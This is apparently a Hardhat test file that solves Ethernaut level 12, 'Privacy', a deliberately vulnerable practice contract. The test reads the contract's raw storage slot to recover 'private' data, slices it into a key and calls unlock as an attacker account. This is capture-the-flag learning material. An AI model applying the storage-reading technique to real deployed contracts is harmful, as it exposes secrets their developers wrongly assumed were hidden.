import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Privacy} from '../../types/typechain';
import {getStorage} from '../../utils';

describe('Ethernaut 12: Privacy', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Privacy;

  const DATA: [string, string, string] = [
    '0x0ec18718027136372f96fb04400e05bac5ba7feda24823118503bff40bc5eb55',
    '0x61a99635e6d4b7233a35f3d0d5d8fadf2981d424110e8bca127d64958d1e68c0',
    '0x46b7d5d54e84dc3ac47f57bea2ca5f79c04dadf65d3a0f3581dcad259f9480cf',
  ];

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Privacy', owner).then(f => f.deploy(DATA));
    await contract.deployed();
  });

  it('should unlock the contract', async () => {
    const data2 = await getStorage(contract.address, 5);
    expect(data2).to.eq(DATA[2]);
    const key = data2.slice(0, 2 + 32);

    await contract.connect(attacker).unlock(key);
  });

  after(async () => {
    expect(await contract.locked()).to.be.false;
  });
});
